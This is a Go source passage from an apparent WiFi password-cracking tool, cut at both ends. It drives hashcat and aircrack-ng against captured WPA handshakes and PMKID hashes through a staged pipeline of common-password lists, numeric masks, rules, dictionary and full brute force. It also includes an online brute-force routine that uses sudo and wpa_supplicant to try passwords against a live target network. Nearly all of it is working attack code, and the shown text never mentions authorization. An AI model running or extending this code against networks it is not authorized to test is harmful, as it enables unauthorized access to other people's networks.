	return crackWithHashcatMode(hashFile, "dictionary", wordlist, 30*time.Minute)
}

// crackWithHashcatMode runs hashcat with a specific attack mode.
func crackWithHashcatMode(hashFile, attackMode, wordlist string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: Hashcat, Success: false}

	if _, err := os.Stat(hashFile); os.IsNotExist(err) {
		result.Details = fmt.Sprintf("Hash file not found: %s", hashFile)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	hashcatPath, err := findHashcat()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Mode 22000 handles both PMKID and handshake hashes (WPA-PBKDF2-PMKID+EAPOL).
	args := []string{"-m", "22000"}

	switch attackMode {
	case "brute":
		// Brute force: try 8-digit numeric passwords (very common for ISP defaults).
		args = append(args, "-a", "3", hashFile, "?d?d?d?d?d?d?d?d")
	case "rule":
		if wordlist == "" {
			wordlists := FindWordlists()
			if len(wordlists) == 0 {
				result.Details = "No wordlist found. Specify --wordlist or install rockyou.txt"
				result.Elapsed = time.Since(start)
				return result, nil
			}
			wordlist = wordlists[0]
		}
		rules := findHashcatRules(hashcatPath)
		args = append(args, "-a", "0", "-r", rules, hashFile, wordlist)
	default:
		// Dictionary mode (default).
		if wordlist == "" {
			wordlists := FindWordlists()
			if len(wordlists) == 0 {
				result.Details = "No wordlist found. Specify --wordlist or install rockyou.txt"
				result.Elapsed = time.Since(start)
				return result, nil
			}
			wordlist = wordlists[0]
		}
		args = append(args, "-a", "0", hashFile, wordlist)
	}

	// Common hashcat options.
	args = append(args,
		"--potfile-disable",
		"--status",
		"--status-timer=10",
		"-O",      // Optimized kernels
		"--quiet", // Suppress banner
	)

	if isDarwin() {
		args = append(args, "--backend-devices=1") // Metal backend
	}

	cmd := exec.CommandContext(context.Background(), hashcatPath, args...)
	out, err := runCmdBytes(cmd, timeout)
	stdoutText := string(out)

	// Parse hashcat output for cracked password.
	password := parseHashcatOutput(stdoutText)

	if password != "" {
		result.Success = true
		result.Password = password
		result.Details = fmt.Sprintf("Password cracked: %s", password)
	} else if errors.Is(err, errCommandTimedOut) {
		result.Details = fmt.Sprintf("Hashcat timed out after %v", timeout.Round(time.Second))
	} else if err != nil {
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			exitCode := exitErr.ExitCode()
			if exitCode == 1 {
				result.Details = "Hashcat exhausted wordlist -- password not found"
			} else if exitCode == 0 {
				result.Details = "Hashcat completed but no password parsed from output"
			} else {
				tail := stdoutText
				if len(tail) > 200 {
					tail = tail[len(tail)-200:]
				}
				result.Details = fmt.Sprintf("Hashcat exited with code %d. %s", exitCode, tail)
			}
		} else {
			result.Details = fmt.Sprintf("Hashcat failed: %v", err)
		}
	} else {
		result.Details = "Hashcat completed but no password parsed from output"
	}

	result.CaptureFile = hashFile
	result.Elapsed = time.Since(start)
	return result, nil
}

// parseHashcatOutput parses hashcat stdout for cracked password.
//
// Hashcat prints cracked hashes as: <hash>:<password>
// For WPA mode 22000, the hash line is long, password is after the last colon.
func parseHashcatOutput(stdout string) string {
	for _, line := range strings.Split(stdout, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "[") || strings.HasPrefix(line, "Session") {
			continue
		}
		if strings.Contains(line, ":") && (strings.Contains(line, "WPA") || strings.Count(line, ":") > 3) {
			parts := strings.SplitN(line, ":", -1)
			password := parts[len(parts)-1]
			if password != "" && password != line {
				return password
			}
		}
	}
	return ""
}

// findHashcatRules finds a hashcat rules file for rule-based attacks.
func findHashcatRules(hashcatPath string) string {
	hashcatDir := filepath.Dir(hashcatPath)
	candidates := []string{
		filepath.Join(hashcatDir, "rules", "best64.rule"),
		filepath.Join(hashcatDir, "..", "share", "hashcat", "rules", "best64.rule"),
		"/usr/share/hashcat/rules/best64.rule",
		"/opt/homebrew/share/hashcat/rules/best64.rule",
		"/usr/local/share/hashcat/rules/best64.rule",
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}
	return "best64.rule"
}

// ---------------------------------------------------------------------------
// Aircrack-ng cracking (CPU fallback)
// ---------------------------------------------------------------------------

// CrackWithAircrack cracks a captured handshake with aircrack-ng (CPU-only).
//
// This is a fallback when hashcat is not available. aircrack-ng is CPU-only
// and significantly slower, but works on any system without GPU requirements.
func CrackWithAircrack(captureFile, wordlist string) (*Result, error) {
	return crackWithAircrackTimeout(captureFile, wordlist, 30*time.Minute)
}

func crackWithAircrackTimeout(captureFile, wordlist string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: Dictionary, Success: false}

	if _, err := os.Stat(captureFile); os.IsNotExist(err) {
		result.Details = fmt.Sprintf("Capture file not found: %s", captureFile)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	aircrackPath, err := findAircrack()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	if wordlist == "" {
		wordlists := FindWordlists()
		if len(wordlists) == 0 {
			result.Details = "No wordlist found. Specify --wordlist or install rockyou.txt"
			result.Elapsed = time.Since(start)
			return result, nil
		}
		wordlist = wordlists[0]
	}

	if _, err := os.Stat(wordlist); os.IsNotExist(err) {
		result.Details = fmt.Sprintf("Wordlist not found: %s", wordlist)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	cmd := exec.CommandContext(context.Background(), aircrackPath, "-w", wordlist, "-q", captureFile)
	out, err := runCmdBytes(cmd, timeout)
	stdoutText := string(out)

	// Parse aircrack-ng output for "KEY FOUND! [ password ]".
	keyRE := regexp.MustCompile(`KEY FOUND!\s*\[\s*(.+?)\s*\]`)
	if m := keyRE.FindStringSubmatch(stdoutText); len(m) > 1 {
		result.Success = true
		result.Password = m[1]
		result.Details = fmt.Sprintf("Password cracked: %s", result.Password)
	} else if errors.Is(err, errCommandTimedOut) {
		result.Details = fmt.Sprintf("Aircrack timed out after %v", timeout.Round(time.Second))
	} else if err != nil {
		result.Details = fmt.Sprintf("Aircrack failed: %v", err)
	} else {
		result.Details = "Password not found in wordlist"
	}

	result.CaptureFile = captureFile
	result.Elapsed = time.Since(start)
	return result, nil
}

// ---------------------------------------------------------------------------
// Smart cracking pipeline
// ---------------------------------------------------------------------------

type smartCrackStage int

const (
	smartCrackStageCommonPasswords smartCrackStage = 1 + iota
	smartCrackStageNumericMasks
	smartCrackStageWordNumberRules
	smartCrackStageDictionary
	smartCrackStageSmartBrute
	smartCrackStageFullBrute
)

type smartCrackOptions struct {
	startStage smartCrackStage
	endStage   smartCrackStage
	fullBrute  bool
}

func normalizeSmartCrackOptions(opts smartCrackOptions) smartCrackOptions {
	if opts.startStage == 0 {
		opts.startStage = smartCrackStageCommonPasswords
	}
	if opts.endStage == 0 {
		opts.endStage = smartCrackStageSmartBrute
		if opts.fullBrute {
			opts.endStage = smartCrackStageFullBrute
		}
	}
	if opts.endStage < opts.startStage {
		opts.endStage = opts.startStage
	}
	return opts
}

func (opts smartCrackOptions) includes(stage smartCrackStage) bool {
	opts = normalizeSmartCrackOptions(opts)
	return stage >= opts.startStage && stage <= opts.endStage
}

func selectedSmartCrackStages(hasWordlists bool, opts smartCrackOptions) []smartCrackStage {
	opts = normalizeSmartCrackOptions(opts)
	allStages := []smartCrackStage{
		smartCrackStageCommonPasswords,
		smartCrackStageNumericMasks,
		smartCrackStageWordNumberRules,
		smartCrackStageDictionary,
		smartCrackStageSmartBrute,
		smartCrackStageFullBrute,
	}

	var stages []smartCrackStage
	for _, stage := range allStages {
		if !opts.includes(stage) {
			continue
		}
		if stage == smartCrackStageDictionary && !hasWordlists {
			continue
		}
		if stage == smartCrackStageFullBrute && !opts.fullBrute {
			continue
		}
		stages = append(stages, stage)
	}
	return stages
}

func smartCrackScopeLabel(opts smartCrackOptions) string {
	opts = normalizeSmartCrackOptions(opts)
	if opts.startStage == opts.endStage {
		return fmt.Sprintf("SmartCrack stage %d", opts.startStage)
	}
	return fmt.Sprintf("SmartCrack stages %d-%d", opts.startStage, opts.endStage)
}

// SmartCrack tries attacks in order of probability, from common passwords
// to increasingly complex brute force patterns. Returns immediately on first
// success. Each stage has its own timeout and moves to the next if not cracked.
//
// Stages:
//  1. Common passwords (embedded top 1000 WiFi passwords) - < 1 min
//  2. Numeric patterns (8-10 digit masks) - < 5 min
//  3. Common word+number combos (hashcat rules on small wordlist) - < 10 min
//  4. Dictionary (rockyou.txt if available) - < 30 min
//  5. Smart brute force (masks + rules for common patterns) - hours
//  6. Full brute force (all printable ASCII, 8-12 chars) - days, only if fullBrute=true
func SmartCrack(hashFile string, timeout time.Duration, fullBrute bool) (*Result, error) {
	return smartCrackWithOptions(hashFile, timeout, smartCrackOptions{
		fullBrute: fullBrute,
	})
}

func smartCrackWithOptions(hashFile string, timeout time.Duration, opts smartCrackOptions) (*Result, error) {
	opts = normalizeSmartCrackOptions(opts)
	start := time.Now()

	if _, err := os.Stat(hashFile); os.IsNotExist(err) {
		return &Result{
			Method:  SmartCrackM,
			Success: false,
			Details: fmt.Sprintf("Hash file not found: %s", hashFile),
			Elapsed: time.Since(start),
		}, nil
	}

	hashcatPath, err := findHashcat()
	if err != nil {
		return &Result{
			Method:  SmartCrackM,
			Success: false,
			Details: fmt.Sprintf("hashcat not found: %v", err),
			Elapsed: time.Since(start),
		}, nil
	}

	wordlists := FindWordlists()

	// Stage 1: Common WiFi passwords (embedded list).
	if opts.includes(smartCrackStageCommonPasswords) {
		log.Printf("[smart-crack] Stage 1/6: Trying %d common WiFi passwords...", len(commonWifiPasswords))
		stageTimeout := min(1*time.Minute, timeout-time.Since(start))
		if result := smartCrackCommonPasswords(hashFile, hashcatPath, stageTimeout, start); result != nil {
			return result, nil
		}
		if time.Since(start) >= timeout {
			return smartCrackTimeout(hashFile, "Stage 1 (common passwords)", start), nil
		}
	}

	// Stage 2: Numeric patterns (8-digit, dates, 9-digit, 10-digit).
	if opts.includes(smartCrackStageNumericMasks) {
		log.Printf("[smart-crack] Stage 2/6: Trying numeric mask patterns...")
		stageTimeout := min(5*time.Minute, timeout-time.Since(start))
		if result := smartCrackNumericMasks(hashFile, hashcatPath, stageTimeout, start); result != nil {
			return result, nil
		}
		if time.Since(start) >= timeout {
			return smartCrackTimeout(hashFile, "Stage 2 (numeric patterns)", start), nil
		}
	}

	// Stage 3: Common word + number combos (rules on embedded wordlist).
	if opts.includes(smartCrackStageWordNumberRules) {
		log.Printf("[smart-crack] Stage 3/6: Trying word+number combos with rules...")
		stageTimeout := min(10*time.Minute, timeout-time.Since(start))
		if result := smartCrackWordNumberRules(hashFile, hashcatPath, stageTimeout, start); result != nil {
			return result, nil
		}
		if time.Since(start) >= timeout {
			return smartCrackTimeout(hashFile, "Stage 3 (word+number combos)", start), nil
		}
	}

	// Stage 4: Dictionary attack (rockyou.txt if available).
	if opts.includes(smartCrackStageDictionary) {
		if len(wordlists) > 0 {
			log.Printf("[smart-crack] Stage 4/6: Dictionary attack with %s...", filepath.Base(wordlists[0]))
			stageTimeout := min(30*time.Minute, timeout-time.Since(start))
			if result := smartCrackDictionary(hashFile, hashcatPath, wordlists[0], stageTimeout, start); result != nil {
				return result, nil
			}
		} else {
			log.Printf("[smart-crack] Stage 4/6: Skipped (no wordlist found)")
		}
		if time.Since(start) >= timeout {
			return smartCrackTimeout(hashFile, "Stage 4 (dictionary)", start), nil
		}
	}

	// Stage 5: Smart brute force (alpha+digit masks, rules).
	if opts.includes(smartCrackStageSmartBrute) {
		log.Printf("[smart-crack] Stage 5/6: Smart brute force with masks and rules...")
		stageTimeout := timeout - time.Since(start)
		if !opts.fullBrute {
			// Cap at 2 hours if full brute not requested.
			stageTimeout = min(2*time.Hour, stageTimeout)
		}
		if result := smartCrackMasks(hashFile, hashcatPath, stageTimeout, start); result != nil {
			return result, nil
		}
		if time.Since(start) >= timeout {
			return smartCrackTimeout(hashFile, "Stage 5 (smart brute force)", start), nil
		}
	}

	// Stage 6: Full brute force (only if explicitly requested).
	if opts.includes(smartCrackStageFullBrute) && opts.fullBrute {
		log.Printf("[smart-crack] Stage 6/6: Full brute force (all printable ASCII, 8-12 chars)...")
		stageTimeout := timeout - time.Since(start)
		if result := smartCrackFullBrute(hashFile, hashcatPath, stageTimeout, start); result != nil {
			return result, nil
		}
	}

	return &Result{
		Method:      SmartCrackM,
		Success:     false,
		CaptureFile: hashFile,
		Details:     fmt.Sprintf("%s exhausted in %v", smartCrackScopeLabel(opts), time.Since(start).Round(time.Second)),
		Elapsed:     time.Since(start),
	}, nil
}

// smartCrackCommonPasswords writes the embedded password list to a temp file
// and runs hashcat in dictionary mode against it.
func smartCrackCommonPasswords(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
	tmpFileName, cleanup, err := writeTempWordlist("nowifi-common-*.txt", commonWifiPasswords)
	if err != nil {
		return nil
	}
	defer cleanup()

	args := buildHashcatArgs(hashFile, "-a", "0", hashFile, tmpFileName)
	password := runHashcatWithTimeout(hashcatPath, args, timeout)
	if password != "" {
		return &Result{
			Method:      SmartCrackM,
			Success:     true,
			Password:    password,
			CaptureFile: hashFile,
			Details:     fmt.Sprintf("Cracked with common password list: %s", password),
			Elapsed:     time.Since(start),
		}
	}
	return nil
}

func writeTempWordlist(pattern string, words []string) (string, func(), error) {
	tmpFile, err := os.CreateTemp("", pattern)
	if err != nil {
		return "", nil, err
	}

	fileName := tmpFile.Name()
	closed := false
	cleanup := func() {
		_ = os.Remove(fileName)
	}
	defer func() {
		if !closed {
			_ = tmpFile.Close()
			cleanup()
		}
	}()

	for _, word := range words {
		if _, err := fmt.Fprintln(tmpFile, word); err != nil {
			return "", nil, err
		}
	}

	if err := tmpFile.Close(); err != nil {
		return "", nil, err
	}
	closed = true

	return fileName, cleanup, nil
}

// smartCrackNumericMasks runs the numeric subset of hashcatMasks.
func smartCrackNumericMasks(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
	stageStart := time.Now()
	for _, mask := range hashcatMasks {
		if time.Since(stageStart) >= timeout {
			break
		}
		// Only run numeric-ish masks (those containing only ?d and literal digits).
		if !isNumericMask(mask.Mask) {
			continue
		}
		remaining := timeout - time.Since(stageStart)
		maskTimeout := min(remaining, 2*time.Minute)

		log.Printf("[smart-crack]   mask: %s (%s, est %s)", mask.Mask, mask.Name, mask.EstTime)
		args := buildHashcatArgs(hashFile, "-a", "3", hashFile, mask.Mask)
		password := runHashcatWithTimeout(hashcatPath, args, maskTimeout)
		if password != "" {
			return &Result{
				Method:      SmartCrackM,
				Success:     true,
				Password:    password,
				CaptureFile: hashFile,
				Details:     fmt.Sprintf("Cracked with mask %s (%s): %s", mask.Mask, mask.Name, password),
				Elapsed:     time.Since(start),
			}
		}
	}
	return nil
}

// smartCrackWordNumberRules runs the embedded wordlist with hashcat rules.
func smartCrackWordNumberRules(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
	// Write a small focused wordlist of common base words.
	baseWords := []string{
		"password", "welcome", "letmein", "master", "dragon",
		"monkey", "shadow", "sunshine", "trustno", "football",
		"baseball", "soccer", "hockey", "basketball", "access",
		"hello", "charlie", "donald", "batman", "superman",
		"michael", "jordan", "robert", "daniel", "thomas",
		"love", "princess", "angel", "summer", "winter",
		"spring", "autumn", "internet", "network", "wireless",
		"wifi", "admin", "guest", "home", "house",
		"secret", "private", "test", "temp", "user",
		"lucky", "happy", "strong", "power", "energy",
		"tiger", "eagle", "falcon", "wolf", "bear",
		"coffee", "pizza", "guitar", "music", "star",
	}
	tmpFileName, cleanup, err := writeTempWordlist("nowifi-bases-*.txt", baseWords)
	if err != nil {
		return nil
	}
	defer cleanup()

	// Try with best64.rule first.
	rules := findHashcatRules(hashcatPath)
	if rules != "" {
		stageStart := time.Now()
		remaining := timeout - time.Since(stageStart)
		args := buildHashcatArgs(hashFile, "-a", "0", "-r", rules, hashFile, tmpFileName)
		password := runHashcatWithTimeout(hashcatPath, args, min(remaining, 5*time.Minute))
		if password != "" {
			return &Result{
				Method:      SmartCrackM,
				Success:     true,
				Password:    password,
				CaptureFile: hashFile,
				Details:     fmt.Sprintf("Cracked with rules (%s): %s", filepath.Base(rules), password),
				Elapsed:     time.Since(start),
			}
		}
	}

	// Try d3ad0ne.rule if available.
	d3ad0neRule := findHashcatRuleByName(hashcatPath, "d3ad0ne.rule")
	if d3ad0neRule != "" {
		stageStart := time.Now()
		remaining := timeout - time.Since(stageStart)
		args := buildHashcatArgs(hashFile, "-a", "0", "-r", d3ad0neRule, hashFile, tmpFileName)
		password := runHashcatWithTimeout(hashcatPath, args, min(remaining, 5*time.Minute))
		if password != "" {
			return &Result{
				Method:      SmartCrackM,
				Success:     true,
				Password:    password,
				CaptureFile: hashFile,
				Details:     fmt.Sprintf("Cracked with d3ad0ne rules: %s", password),
				Elapsed:     time.Since(start),
			}
		}
	}

	return nil
}

// smartCrackDictionary runs a dictionary attack with an external wordlist.
func smartCrackDictionary(hashFile, hashcatPath, wordlist string, timeout time.Duration, start time.Time) *Result {
	// Plain dictionary first.
	args := buildHashcatArgs(hashFile, "-a", "0", hashFile, wordlist)
	password := runHashcatWithTimeout(hashcatPath, args, min(timeout/2, 15*time.Minute))
	if password != "" {
		return &Result{
			Method:      SmartCrackM,
			Success:     true,
			Password:    password,
			CaptureFile: hashFile,
			Details:     fmt.Sprintf("Cracked with dictionary (%s): %s", filepath.Base(wordlist), password),
			Elapsed:     time.Since(start),
		}
	}

	// Dictionary + best64 rules.
	rules := findHashcatRules(hashcatPath)
	if rules != "" {
		remaining := timeout - time.Since(start)
		args = buildHashcatArgs(hashFile, "-a", "0", "-r", rules, hashFile, wordlist)
		password = runHashcatWithTimeout(hashcatPath, args, min(remaining, 15*time.Minute))
		if password != "" {
			return &Result{
				Method:      SmartCrackM,
				Success:     true,
				Password:    password,
				CaptureFile: hashFile,
				Details:     fmt.Sprintf("Cracked with dictionary+rules (%s + %s): %s", filepath.Base(wordlist), filepath.Base(rules), password),
				Elapsed:     time.Since(start),
			}
		}
	}

	return nil
}

// smartCrackMasks runs all alpha+digit mask patterns.
func smartCrackMasks(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
	stageStart := time.Now()
	for _, mask := range hashcatMasks {
		if time.Since(stageStart) >= timeout {
			break
		}
		// Skip numeric masks (already tried in stage 2).
		if isNumericMask(mask.Mask) {
			continue
		}
		remaining := timeout - time.Since(stageStart)
		// Give each mask a proportional timeout, min 30s, max 30 min.
		maskTimeout := min(remaining, 30*time.Minute)
		if maskTimeout < 30*time.Second {
			break
		}

		log.Printf("[smart-crack]   mask: %s (%s, est %s)", mask.Mask, mask.Name, mask.EstTime)
		args := buildHashcatArgs(hashFile, "-a", "3", hashFile, mask.Mask)
		password := runHashcatWithTimeout(hashcatPath, args, maskTimeout)
		if password != "" {
			return &Result{
				Method:      SmartCrackM,
				Success:     true,
				Password:    password,
				CaptureFile: hashFile,
				Details:     fmt.Sprintf("Cracked with mask %s (%s): %s", mask.Mask, mask.Name, password),
				Elapsed:     time.Since(start),
			}
		}
	}
	return nil
}

// smartCrackFullBrute tries all printable ASCII 8-12 chars. Very slow, last resort.
func smartCrackFullBrute(hashFile, hashcatPath string, timeout time.Duration, start time.Time) *Result {
	stageStart := time.Now()

	// Incrementing mask attack: ?a covers all printable ASCII.
	// --increment from 8 to 12 chars.
	remaining := timeout - time.Since(stageStart)
	args := buildHashcatArgs(hashFile,
		"-a", "3",
		"--increment", "--increment-min=8", "--increment-max=12",
		hashFile,
		"?a?a?a?a?a?a?a?a?a?a?a?a",
	)
	password := runHashcatWithTimeout(hashcatPath, args, remaining)
	if password != "" {
		return &Result{
			Method:      SmartCrackM,
			Success:     true,
			Password:    password,
			CaptureFile: hashFile,
			Details:     fmt.Sprintf("Cracked with full brute force: %s", password),
			Elapsed:     time.Since(start),
		}
	}
	return nil
}

// buildHashcatArgs constructs hashcat arguments with standard options.
// The provided extraArgs are inserted before standard flags.
func buildHashcatArgs(hashFile string, extraArgs ...string) []string {
	args := []string{"-m", "22000"}
	args = append(args, extraArgs...)
	args = append(args,
		"--potfile-disable",
		"--status",
		"--status-timer=10",
		"-O",
		"--quiet",
	)
	if isDarwin() {
		args = append(args, "--backend-devices=1")
	}
	return args
}

// runHashcatWithTimeout runs hashcat with the given args and timeout,
// returning the cracked password or empty string.
func runHashcatWithTimeout(hashcatPath string, args []string, timeout time.Duration) string {
	cmd := exec.CommandContext(context.Background(), hashcatPath, args...)
	out, _ := runCmdBytes(cmd, timeout)
	return parseHashcatOutput(string(out))
}

// isNumericMask returns true if the mask only contains ?d placeholders and literal digits.
func isNumericMask(mask string) bool {
	// Replace all ?d with empty, then check if only digits remain.
	stripped := strings.ReplaceAll(mask, "?d", "")
	for _, c := range stripped {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

// findHashcatRuleByName finds a specific hashcat rule file.
func findHashcatRuleByName(hashcatPath, ruleName string) string {
	hashcatDir := filepath.Dir(hashcatPath)
	candidates := []string{
		filepath.Join(hashcatDir, "rules", ruleName),
		filepath.Join(hashcatDir, "..", "share", "hashcat", "rules", ruleName),
		"/usr/share/hashcat/rules/" + ruleName,
		"/opt/homebrew/share/hashcat/rules/" + ruleName,
		"/usr/local/share/hashcat/rules/" + ruleName,
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}
	return ""
}

// smartCrackTimeout returns a Result indicating the SmartCrack pipeline
// ran out of time at the given stage.
func smartCrackTimeout(hashFile, stage string, start time.Time) *Result {
	return &Result{
		Method:      SmartCrackM,
		Success:     false,
		CaptureFile: hashFile,
		Details:     fmt.Sprintf("SmartCrack timeout at %s after %v", stage, time.Since(start).Round(time.Second)),
		Elapsed:     time.Since(start),
	}
}

// ---------------------------------------------------------------------------
// Online brute force (no monitor mode needed)
// ---------------------------------------------------------------------------

// OnlineBruteForce attempts PSK connections using wpa_supplicant in daemon mode.
// Very slow (~20 attempts/min) but does NOT require monitor mode -- works with
// any managed-mode WiFi interface. This is the last resort when all other
// methods (which require monitor mode or captured hashes) have failed.
//
// It iterates through the embedded common password list, generating a
// wpa_supplicant config for each candidate and attempting to associate.
func OnlineBruteForce(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: OnlineBrute, Success: false}

	outputDir := timestampedDir("online_brute")
	logFile := filepath.Join(outputDir, "online_brute.log")

	// Check for wpa_supplicant or wpa_cli.
	wpaSupplicant, err := findWpaSupplicant()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	wpaCli, err := findWpaCli()
	if err != nil {
		// Fall back to wpa_supplicant config-per-attempt method.
		return onlineBruteViaConfig(target, iface, wpaSupplicant, outputDir, logFile, timeout, start)
	}

	// Preferred method: use wpa_cli to test passwords via control interface.
	return onlineBruteViaCli(target, iface, wpaSupplicant, wpaCli, outputDir, logFile, timeout, start)
}

// onlineBruteViaCli uses wpa_supplicant + wpa_cli to test passwords interactively.
func onlineBruteViaCli(target WifiTarget, iface, wpaSupplicant, wpaCli, outputDir, logFile string, timeout time.Duration, start time.Time) (*Result, error) {
	result := &Result{Method: OnlineBrute, Success: false}

	// Start wpa_supplicant in daemon mode with a control interface.
	ctrlDir := filepath.Join(outputDir, "ctrl")
	_ = os.MkdirAll(ctrlDir, 0o755)

	confFile := filepath.Join(outputDir, "wpa_base.conf")
	conf := fmt.Sprintf("ctrl_interface=%s\n", ctrlDir)
	if err := os.WriteFile(confFile, []byte(conf), 0o600); err != nil {
		result.Details = fmt.Sprintf("failed to write wpa_supplicant config: %v", err)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Start wpa_supplicant daemon.
	supCmd := exec.CommandContext(context.Background(), "sudo", wpaSupplicant,
		"-i", iface,
		"-c", confFile,
		"-B", // Daemonize
		"-f", filepath.Join(outputDir, "wpa_supplicant.log"),
	)
	if err := supCmd.Run(); err != nil {
		result.Details = fmt.Sprintf("failed to start wpa_supplicant: %v", err)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Ensure we kill wpa_supplicant when done.
	defer func() {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = exec.CommandContext(ctx, "sudo", "killall", "-9", "wpa_supplicant").Run()
	}()

	// Give wpa_supplicant time to initialize.
	time.Sleep(2 * time.Second)

	var logEntries []string
	attempted := 0

	for _, password := range commonWifiPasswords {
		if time.Since(start) >= timeout {
			break
		}

		attempted++
		if attempted%50 == 0 {
			log.Printf("[online-brute] Tried %d/%d passwords (%.1f%%)...",
				attempted, len(commonWifiPasswords),
				float64(attempted)/float64(len(commonWifiPasswords))*100)
		}

		// Add network via wpa_cli.
		addOut := runWithTimeout(wpaCli, []string{"-i", iface, "add_network"}, 5*time.Second)
		netID := strings.TrimSpace(addOut)
		if netID == "" || netID == "FAIL" {
			continue
		}

		// Configure network.
		_ = runWithTimeout(wpaCli, []string{"-i", iface, "set_network", netID, "ssid", fmt.Sprintf(`"%s"`, target.SSID)}, 3*time.Second)
		_ = runWithTimeout(wpaCli, []string{"-i", iface, "set_network", netID, "psk", fmt.Sprintf(`"%s"`, password)}, 3*time.Second)

		// Enable and try to connect.
		_ = runWithTimeout(wpaCli, []string{"-i", iface, "select_network", netID}, 3*time.Second)

		// Wait for connection result (~3 seconds is typical).
		time.Sleep(3 * time.Second)

		// Check status.
		statusOut := runWithTimeout(wpaCli, []string{"-i", iface, "status"}, 3*time.Second)
		if strings.Contains(statusOut, "wpa_state=COMPLETED") &&
			strings.Contains(statusOut, target.SSID) {
			// Connected!
			result.Success = true
			result.Password = password
			result.Details = fmt.Sprintf("Online brute force found password after %d attempts: %s", attempted, password)
			result.CaptureFile = logFile
			result.Elapsed = time.Since(start)

			logEntries = append(logEntries, fmt.Sprintf("FOUND: %s (attempt %d)", password, attempted))
			_ = os.WriteFile(logFile, []byte(strings.Join(logEntries, "\n")+"\n"), 0o600)

			// Disconnect.
			_ = runWithTimeout(wpaCli, []string{"-i", iface, "disconnect"}, 3*time.Second)
			return result, nil
		}

		// Remove failed network.
		_ = runWithTimeout(wpaCli, []string{"-i", iface, "remove_network", netID}, 3*time.Second)

		logEntries = append(logEntries, fmt.Sprintf("FAIL: %s", password))
	}

	_ = os.WriteFile(logFile, []byte(strings.Join(logEntries, "\n")+"\n"), 0o600)

	if time.Since(start) >= timeout {
		result.Details = fmt.Sprintf("Online brute force timed out after %d attempts in %v", attempted, timeout)
	} else {
		result.Details = fmt.Sprintf("Online brute force exhausted %d common passwords", attempted)
	}
	result.CaptureFile = logFile
	result.Elapsed = time.Since(start)
	return result, nil
}

// onlineBruteViaConfig falls back to testing each password by restarting
// wpa_supplicant with a new config file per attempt. Slower but works
// without wpa_cli.
func onlineBruteViaConfig(target WifiTarget, iface, wpaSupplicant, outputDir, logFile string, timeout time.Duration, start time.Time) (*Result, error) {
	result := &Result{Method: OnlineBrute, Success: false}

	var logEntries []string
	attempted := 0

	for _, password := range commonWifiPasswords {
		if time.Since(start) >= timeout {
			break
		}

		attempted++
		if attempted%20 == 0 {
			log.Printf("[online-brute] Tried %d/%d passwords (config mode, %.1f%%)...",
				attempted, len(commonWifiPasswords),
				float64(attempted)/float64(len(commonWifiPasswords))*100)
		}

		confFile := filepath.Join(outputDir, "wpa_attempt.conf")
		conf := fmt.Sprintf("network={\n    ssid=\"%s\"\n    psk=\"%s\"\n    key_mgmt=WPA-PSK\n}\n",
			target.SSID, password)
		if err := os.WriteFile(confFile, []byte(conf), 0o600); err != nil {
			continue
		}

		// Run wpa_supplicant for a brief connection attempt.
		cmd := exec.CommandContext(context.Background(), "sudo", wpaSupplicant,
			"-i", iface,
			"-c", confFile,
			"-D", "nl80211,wext",
		)

		out, _ := runCmdBytes(cmd, 5*time.Second)
		outStr := string(out)

		// Check for successful association.
		if strings.Contains(outStr, "CTRL-EVENT-CONNECTED") ||
			strings.Contains(outStr, "WPA: Key negotiation completed") {
			result.Success = true
			result.Password = password
			result.Details = fmt.Sprintf("Online brute force found password after %d attempts: %s", attempted, password)
			result.CaptureFile = logFile
			result.Elapsed = time.Since(start)

			logEntries = append(logEntries, fmt.Sprintf("FOUND: %s (attempt %d)", password, attempted))
			_ = os.WriteFile(logFile, []byte(strings.Join(logEntries, "\n")+"\n"), 0o600)
			return result, nil
		}

		logEntries = append(logEntries, fmt.Sprintf("FAIL: %s", password))

		// Kill any lingering wpa_supplicant.
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		_ = exec.CommandContext(ctx, "sudo", "killall", "-9", "wpa_supplicant").Run()
		cancel()
		time.Sleep(500 * time.Millisecond)
	}

	_ = os.WriteFile(logFile, []byte(strings.Join(logEntries, "\n")+"\n"), 0o600)

	if time.Since(start) >= timeout {
		result.Details = fmt.Sprintf("Online brute force timed out after %d attempts in %v", attempted, timeout)
	} else {
		result.Details = fmt.Sprintf("Online brute force exhausted %d common passwords (config mode)", attempted)
	}
	result.CaptureFile = logFile
	result.Elapsed = time.Since(start)
	return result, nil
}

// findWpaSupplicant locates the wpa_supplicant binary.
func findWpaSupplicant() (string, error) {
	return findTool("wpa_supplicant", "apt install wpasupplicant  OR  brew install wpa_supplicant")
}

// findWpaCli locates the wpa_cli binary.
func findWpaCli() (string, error) {
	return findTool("wpa_cli", "apt install wpasupplicant  OR  brew install wpa_supplicant")
}

// ---------------------------------------------------------------------------
// Wordlist discovery
// ---------------------------------------------------------------------------

// FindWordlists finds available wordlists on the system.
// Returns paths sorted by preference (rockyou first).
func FindWordlists() []string {
	home, _ := os.UserHomeDir()
	if home == "" {
		home = "/tmp"
	}

	commonPaths := []string{
		"/usr/share/wordlists/rockyou.txt",
		"/usr/share/wordlists/rockyou.txt.gz",
